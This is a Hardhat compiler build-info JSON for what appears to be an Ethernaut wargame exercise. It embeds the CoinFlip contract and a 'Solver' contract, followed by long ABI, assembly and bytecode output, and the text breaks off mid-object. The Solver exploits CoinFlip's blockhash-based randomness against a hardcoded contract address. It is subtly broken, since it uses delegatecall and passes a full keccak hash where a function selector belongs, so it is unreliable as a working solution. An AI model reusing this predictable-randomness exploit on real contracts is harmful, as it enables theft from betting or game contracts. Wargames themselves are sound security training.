{
	"id": "58281a2c19222a0b5e02d116bb554dad",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.7",
	"solcLongVersion": "0.8.7+commit.e28d00a7",
	"input": {
		"language": "Solidity",
		"sources": {
			"ethernaut.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.7;\r\n\r\n//import '@openzeppelin/contracts/math/SafeMath.sol';\r\ncontract CoinFlip {\r\n\r\n  uint256 public consecutiveWins;\r\n  uint256 lastHash;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor() public {\r\n    consecutiveWins = 0;\r\n  }\r\n\r\n  function flip(bool _guess) public returns (bool) {\r\n    uint256 blockValue = uint256(blockhash(block.number - 1));\r\n\r\n    if (lastHash == blockValue) {\r\n      revert();\r\n    }\r\n\r\n    lastHash = blockValue;\r\n    uint256 coinFlip = blockValue / FACTOR;\r\n    bool side = coinFlip == 1 ? true : false;\r\n\r\n    if (side == _guess) {\r\n      consecutiveWins++;\r\n      return true;\r\n    } else {\r\n      consecutiveWins = 0;\r\n      return false;\r\n    }\r\n  }\r\n}\r\n\r\ncontract Solver {\r\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n    address contractAddr = 0xECd6671D91e677522f698C59B7B7F69A0682D975;\r\n    function solve() public returns (uint256) {\r\n        bool whatToSend = uint256(blockhash(block.number - 1)) / FACTOR > 0;\r\n        if(whatToSend){\r\n            contractAddr.delegatecall(abi.encode(keccak256(\"flip(bool)\"),true));\r\n        }\r\n        else {\r\n            contractAddr.delegatecall(abi.encode(keccak256(\"flip(bool)\"),false));\r\n        }\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"ethernaut.sol": {
				"CoinFlip": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "consecutiveWins",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"ethernaut.sol\":115:806  contract CoinFlip {\r... */\n  mstore(0x40, 0x80)\n    /* \"ethernaut.sol\":213:290  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"ethernaut.sol\":196:290  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"ethernaut.sol\":297:350  constructor() public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"ethernaut.sol\":343:344  0 */\n  0x00\n    /* \"ethernaut.sol\":325:340  consecutiveWins */\n  dup1\n    /* \"ethernaut.sol\":325:344  consecutiveWins = 0 */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"ethernaut.sol\":115:806  contract CoinFlip {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernaut.sol\":115:806  contract CoinFlip {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1d263f67\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ethernaut.sol\":356:803  function flip(bool _guess) public returns (bool) {\r... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"ethernaut.sol\":140:170  uint256 public consecutiveWins */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"ethernaut.sol\":356:803  function flip(bool _guess) public returns (bool) {\r... */\n    tag_8:\n        /* \"ethernaut.sol\":399:403  bool */\n      0x00\n        /* \"ethernaut.sol\":412:430  uint256 blockValue */\n      dup1\n        /* \"ethernaut.sol\":466:467  1 */\n      0x01\n        /* \"ethernaut.sol\":451:463  block.number */\n      number\n        /* \"ethernaut.sol\":451:467  block.number - 1 */\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n        /* \"ethernaut.sol\":441:468  blockhash(block.number - 1) */\n      blockhash\n        /* \"ethernaut.sol\":433:469  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"ethernaut.sol\":412:469  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"ethernaut.sol\":494:504  blockValue */\n      dup1\n        /* \"ethernaut.sol\":482:490  lastHash */\n      sload(0x01)\n        /* \"ethernaut.sol\":482:504  lastHash == blockValue */\n      eq\n        /* \"ethernaut.sol\":478:531  if (lastHash == blockValue) {\r... */\n      iszero\n      tag_18\n      jumpi\n        /* \"ethernaut.sol\":515:523  revert() */\n      0x00\n      dup1\n      revert\n        /* \"ethernaut.sol\":478:531  if (lastHash == blockValue) {\r... */\n    tag_18:\n        /* \"ethernaut.sol\":550:560  blockValue */\n      dup1\n        /* \"ethernaut.sol\":539:547  lastHash */\n      0x01\n        /* \"ethernaut.sol\":539:560  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"ethernaut.sol\":567:583  uint256 coinFlip */\n      0x00\n        /* \"ethernaut.sol\":599:605  FACTOR */\n      sload(0x02)\n        /* \"ethernaut.sol\":586:596  blockValue */\n      dup3\n        /* \"ethernaut.sol\":586:605  blockValue / FACTOR */\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"ethernaut.sol\":567:605  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"ethernaut.sol\":612:621  bool side */\n      0x00\n        /* \"ethernaut.sol\":636:637  1 */\n      0x01\n        /* \"ethernaut.sol\":624:632  coinFlip */\n      dup3\n        /* \"ethernaut.sol\":624:637  coinFlip == 1 */\n      eq\n        /* \"ethernaut.sol\":624:652  coinFlip == 1 ? true : false */\n      tag_21\n      jumpi\n        /* \"ethernaut.sol\":647:652  false */\n      0x00\n        /* \"ethernaut.sol\":624:652  coinFlip == 1 ? true : false */\n      jump(tag_22)\n    tag_21:\n        /* \"ethernaut.sol\":640:644  true */\n      0x01\n        /* \"ethernaut.sol\":624:652  coinFlip == 1 ? true : false */\n    tag_22:\n        /* \"ethernaut.sol\":612:652  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"ethernaut.sol\":673:679  _guess */\n      dup5\n        /* \"ethernaut.sol\":665:679  side == _guess */\n      iszero\n      iszero\n        /* \"ethernaut.sol\":665:669  side */\n      dup2\n        /* \"ethernaut.sol\":665:679  side == _guess */\n      iszero\n      iszero\n      eq\n        /* \"ethernaut.sol\":661:798  if (side == _guess) {\r... */\n      iszero\n      tag_23\n      jumpi\n        /* \"ethernaut.sol\":690:705  consecutiveWins */\n      0x00\n      dup1\n        /* \"ethernaut.sol\":690:707  consecutiveWins++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_24\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"ethernaut.sol\":723:727  true */\n      0x01\n        /* \"ethernaut.sol\":716:727  return true */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_15)\n        /* \"ethernaut.sol\":661:798  if (side == _guess) {\r... */\n    tag_23:\n        /* \"ethernaut.sol\":768:769  0 */\n      0x00\n        /* \"ethernaut.sol\":750:765  consecutiveWins */\n      dup1\n        /* \"ethernaut.sol\":750:769  consecutiveWins = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"ethernaut.sol\":785:790  false */\n      0x00\n        /* \"ethernaut.sol\":778:790  return false */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"ethernaut.sol\":356:803  function flip(bool _guess) public returns (bool) {\r... */\n    tag_15:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"ethernaut.sol\":140:170  uint256 public consecutiveWins */\n    tag_12:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:140   */\n    tag_28:\n        /* \"#utility.yul\":50:55   */\n      0x00\n        /* \"#utility.yul\":88:94   */\n      dup2\n        /* \"#utility.yul\":75:95   */\n      calldataload\n        /* \"#utility.yul\":66:95   */\n      swap1\n      pop\n        /* \"#utility.yul\":104:134   */\n      tag_30\n        /* \"#utility.yul\":128:133   */\n      dup2\n        /* \"#utility.yul\":104:134   */\n      tag_31\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":7:140   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":146:469   */\n    tag_7:\n        /* \"#utility.yul\":202:208   */\n      0x00\n        /* \"#utility.yul\":251:253   */\n      0x20\n        /* \"#utility.yul\":239:248   */\n      dup3\n        /* \"#utility.yul\":230:237   */\n      dup5\n        /* \"#utility.yul\":226:249   */\n      sub\n        /* \"#utility.yul\":222:254   */\n      slt\n        /* \"#utility.yul\":219:338   */\n      iszero\n      tag_33\n      jumpi\n        /* \"#utility.yul\":257:336   */\n      tag_34\n      tag_35\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":219:338   */\n    tag_33:\n        /* \"#utility.yul\":377:378   */\n      0x00\n        /* \"#utility.yul\":402:452   */\n      tag_36\n        /* \"#utility.yul\":444:451   */\n      dup5\n        /* \"#utility.yul\":435:441   */\n      dup3\n        /* \"#utility.yul\":424:433   */\n      dup6\n        /* \"#utility.yul\":420:442   */\n      add\n        /* \"#utility.yul\":402:452   */\n      tag_28\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":392:452   */\n      swap2\n      pop\n        /* \"#utility.yul\":348:462   */\n      pop\n        /* \"#utility.yul\":146:469   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":475:584   */\n    tag_37:\n        /* \"#utility.yul\":556:577   */\n      tag_39\n        /* \"#utility.yul\":571:576   */\n      dup2\n        /* \"#utility.yul\":556:577   */\n      tag_40\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":551:554   */\n      dup3\n        /* \"#utility.yul\":544:578   */\n      mstore\n        /* \"#utility.yul\":475:584   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":590:708   */\n    tag_41:\n        /* \"#utility.yul\":677:701   */\n      tag_43\n        /* \"#utility.yul\":695:700   */\n      dup2\n        /* \"#utility.yul\":677:701   */\n      tag_44\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":672:675   */\n      dup3\n        /* \"#utility.yul\":665:702   */\n      mstore\n        /* \"#utility.yul\":590:708   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":714:924   */\n    tag_10:\n        /* \"#utility.yul\":801:805   */\n      0x00\n        /* \"#utility.yul\":839:841   */\n      0x20\n        /* \"#utility.yul\":828:837   */\n      dup3\n        /* \"#utility.yul\":824:842   */\n      add\n        /* \"#utility.yul\":816:842   */\n      swap1\n      pop\n        /* \"#utility.yul\":852:917   */\n      tag_46\n        /* \"#utility.yul\":914:915   */\n      0x00\n        /* \"#utility.yul\":903:912   */\n      dup4\n        /* \"#utility.yul\":899:916   */\n      add\n        /* \"#utility.yul\":890:896   */\n      dup5\n        /* \"#utility.yul\":852:917   */\n      tag_37\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":714:924   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":930:1152   */\n    tag_14:\n        /* \"#utility.yul\":1023:1027   */\n      0x00\n        /* \"#utility.yul\":1061:1063   */\n      0x20\n        /* \"#utility.yul\":1050:1059   */\n      dup3\n        /* \"#utility.yul\":1046:1064   */\n      add\n        /* \"#utility.yul\":1038:1064   */\n      swap1\n      pop\n        /* \"#utility.yul\":1074:1145   */\n      tag_48\n        /* \"#utility.yul\":1142:1143   */\n      0x00\n        /* \"#utility.yul\":1131:1140   */\n      dup4\n        /* \"#utility.yul\":1127:1144   */\n      add\n        /* \"#utility.yul\":1118:1124   */\n      dup5\n        /* \"#utility.yul\":1074:1145   */\n      tag_41\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":930:1152   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1239:1424   */\n    tag_20:\n        /* \"#utility.yul\":1279:1280   */\n      0x00\n        /* \"#utility.yul\":1296:1316   */\n      tag_52\n        /* \"#utility.yul\":1314:1315   */\n      dup3\n        /* \"#utility.yul\":1296:1316   */\n      tag_44\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1291:1316   */\n      swap2\n      pop\n        /* \"#utility.yul\":1330:1350   */\n      tag_53\n        /* \"#utility.yul\":1348:1349   */\n      dup4\n        /* \"#utility.yul\":1330:1350   */\n      tag_44\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1325:1350   */\n      swap3\n      pop\n        /* \"#utility.yul\":1369:1370   */\n      dup3\n        /* \"#utility.yul\":1359:1394   */\n      tag_54\n      jumpi\n        /* \"#utility.yul\":1374:1392   */\n      tag_55\n      tag_56\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1359:1394   */\n    tag_54:\n        /* \"#utility.yul\":1416:1417   */\n      dup3\n        /* \"#utility.yul\":1413:1414   */\n      dup3\n        /* \"#utility.yul\":1409:1418   */\n      div\n        /* \"#utility.yul\":1404:1418   */\n      swap1\n      pop\n        /* \"#utility.yul\":1239:1424   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1430:1621   */\n    tag_17:\n        /* \"#utility.yul\":1470:1474   */\n      0x00\n        /* \"#utility.yul\":1490:1510   */\n      tag_58\n        /* \"#utility.yul\":1508:1509   */\n      dup3\n        /* \"#utility.yul\":1490:1510   */\n      tag_44\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1485:1510   */\n      swap2\n      pop\n        /* \"#utility.yul\":1524:1544   */\n      tag_59\n        /* \"#utility.yul\":1542:1543   */\n      dup4\n        /* \"#utility.yul\":1524:1544   */\n      tag_44\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1519:1544   */\n      swap3\n      pop\n        /* \"#utility.yul\":1563:1564   */\n      dup3\n        /* \"#utility.yul\":1560:1561   */\n      dup3\n        /* \"#utility.yul\":1557:1565   */\n      lt\n        /* \"#utility.yul\":1554:1588   */\n      iszero\n      tag_60\n      jumpi\n        /* \"#utility.yul\":1568:1586   */\n      tag_61\n      tag_62\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1554:1588   */\n    tag_60:\n        /* \"#utility.yul\":1613:1614   */\n      dup3\n        /* \"#utility.yul\":1610:1611   */\n      dup3\n        /* \"#utility.yul\":1606:1615   */\n      sub\n        /* \"#utility.yul\":1598:1615   */\n      swap1\n      pop\n        /* \"#utility.yul\":1430:1621   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1627:1717   */\n    tag_40:\n        /* \"#utility.yul\":1661:1668   */\n      0x00\n        /* \"#utility.yul\":1704:1709   */\n      dup2\n        /* \"#utility.yul\":1697:1710   */\n      iszero\n        /* \"#utility.yul\":1690:1711   */\n      iszero\n        /* \"#utility.yul\":1679:1711   */\n      swap1\n      pop\n        /* \"#utility.yul\":1627:1717   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1723:1800   */\n    tag_44:\n        /* \"#utility.yul\":1760:1767   */\n      0x00\n        /* \"#utility.yul\":1789:1794   */\n      dup2\n        /* \"#utility.yul\":1778:1794   */\n      swap1\n      pop\n        /* \"#utility.yul\":1723:1800   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1806:2039   */\n    tag_25:\n        /* \"#utility.yul\":1845:1848   */\n      0x00\n        /* \"#utility.yul\":1868:1892   */\n      tag_66\n        /* \"#utility.yul\":1886:1891   */\n      dup3\n        /* \"#utility.yul\":1868:1892   */\n      tag_44\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":1859:1892   */\n      swap2\n      pop\n        /* \"#utility.yul\":1914:1980   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1907:1912   */\n      dup3\n        /* \"#utility.yul\":1904:1981   */\n      eq\n        /* \"#utility.yul\":1901:2004   */\n      iszero\n      tag_67\n      jumpi\n        /* \"#utility.yul\":1984:2002   */\n      tag_68\n      tag_62\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1901:2004   */\n    tag_67:\n        /* \"#utility.yul\":2031:2032   */\n      0x01\n        /* \"#utility.yul\":2024:2029   */\n      dup3\n        /* \"#utility.yul\":2020:2033   */\n      add\n        /* \"#utility.yul\":2013:2033   */\n      swap1\n      pop\n        /* \"#utility.yul\":1806:2039   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2045:2225   */\n    tag_62:\n        /* \"#utility.yul\":2093:2170   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2090:2091   */\n      0x00\n        /* \"#utility.yul\":2083:2171   */\n      mstore\n        /* \"#utility.yul\":2190:2194   */\n      0x11\n        /* \"#utility.yul\":2187:2188   */\n      0x04\n        /* \"#utility.yul\":2180:2195   */\n      mstore\n        /* \"#utility.yul\":2214:2218   */\n      0x24\n        /* \"#utility.yul\":2211:2212   */\n      0x00\n        /* \"#utility.yul\":2204:2219   */\n      revert\n        /* \"#utility.yul\":2231:2411   */\n    tag_56:\n        /* \"#utility.yul\":2279:2356   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2276:2277   */\n      0x00\n        /* \"#utility.yul\":2269:2357   */\n      mstore\n        /* \"#utility.yul\":2376:2380   */\n      0x12\n        /* \"#utility.yul\":2373:2374   */\n      0x04\n        /* \"#utility.yul\":2366:2381   */\n      mstore\n        /* \"#utility.yul\":2400:2404   */\n      0x24\n        /* \"#utility.yul\":2397:2398   */\n      0x00\n        /* \"#utility.yul\":2390:2405   */\n      revert\n        /* \"#utility.yul\":2540:2657   */\n    tag_35:\n        /* \"#utility.yul\":2649:2650   */\n      0x00\n        /* \"#utility.yul\":2646:2647   */\n      dup1\n        /* \"#utility.yul\":2639:2651   */\n      revert\n        /* \"#utility.yul\":2663:2779   */\n    tag_31:\n        /* \"#utility.yul\":2733:2754   */\n      tag_75\n        /* \"#utility.yul\":2748:2753   */\n      dup2\n        /* \"#utility.yul\":2733:2754   */\n      tag_40\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":2726:2731   */\n      dup2\n        /* \"#utility.yul\":2723:2755   */\n      eq\n        /* \"#utility.yul\":2713:2773   */\n      tag_76\n      jumpi\n        /* \"#utility.yul\":2769:2770   */\n      0x00\n        /* \"#utility.yul\":2766:2767   */\n      dup1\n        /* \"#utility.yul\":2759:2771   */\n      revert\n        /* \"#utility.yul\":2713:2773   */\n    tag_76:\n        /* \"#utility.yul\":2663:2779   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212201bb0732535f19ca6de5519d59c0237b8bdd35d34af2d48d56f0a4eeba4ea8bb264736f6c63430008070033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_16": {
									"entryPoint": null,
									"id": 16,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060025534801561003457600080fd5b50600080819055506103308061004b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061013b565b610089565b6040516100629190610186565b60405180910390f35b610073610120565b60405161008091906101a1565b60405180910390f35b60008060014361009991906101ed565b4060001c90508060015414156100ae57600080fd5b806001819055506000600254826100c591906101bc565b90506000600182146100d85760006100db565b60015b9050841515811515141561010c576000808154809291906100fb90610237565b91905055506001935050505061011b565b60008081905550600093505050505b919050565b60005481565b600081359050610135816102e3565b92915050565b600060208284031215610151576101506102de565b5b600061015f84828501610126565b91505092915050565b61017181610221565b82525050565b6101808161022d565b82525050565b600060208201905061019b6000830184610168565b92915050565b60006020820190506101b66000830184610177565b92915050565b60006101c78261022d565b91506101d28361022d565b9250826101e2576101e16102af565b5b828204905092915050565b60006101f88261022d565b91506102038361022d565b92508282101561021657610215610280565b5b828203905092915050565b60008115159050919050565b6000819050919050565b60006102428261022d565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82141561027557610274610280565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600080fd5b6102ec81610221565b81146102f757600080fd5b5056fea26469706673582212201bb0732535f19ca6de5519d59c0237b8bdd35d34af2d48d56f0a4eeba4ea8bb264736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH2 0x330 DUP1 PUSH2 0x4B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x13B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x186 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x1A1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x1ED JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xAE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xC5 SWAP2 SWAP1 PUSH2 0x1BC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xD8 JUMPI PUSH1 0x0 PUSH2 0xDB JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x10C JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xFB SWAP1 PUSH2 0x237 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x11B JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x135 DUP2 PUSH2 0x2E3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x151 JUMPI PUSH2 0x150 PUSH2 0x2DE JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x15F DUP5 DUP3 DUP6 ADD PUSH2 0x126 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x171 DUP2 PUSH2 0x221 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x180 DUP2 PUSH2 0x22D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x19B PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x168 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B6 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x177 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C7 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH2 0x1D2 DUP4 PUSH2 0x22D JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1E2 JUMPI PUSH2 0x1E1 PUSH2 0x2AF JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F8 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH2 0x203 DUP4 PUSH2 0x22D JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x216 JUMPI PUSH2 0x215 PUSH2 0x280 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x242 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH2 0x275 JUMPI PUSH2 0x274 PUSH2 0x280 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2EC DUP2 PUSH2 0x221 JUMP JUMPDEST DUP2 EQ PUSH2 0x2F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SHL 0xB0 PUSH20 0x2535F19CA6DE5519D59C0237B8BDD35D34AF2D48 0xD5 PUSH16 0xA4EEBA4EA8BB264736F6C6343000807 STOP CALLER ",
							"sourceMap": "115:691:0:-:0;;;213:77;196:94;;297:53;;;;;;;;;;343:1;325:15;:19;;;;115:691;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@consecutiveWins_3": {
									"entryPoint": 288,
									"id": 3,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@flip_80": {
									"entryPoint": 137,
									"id": 80,
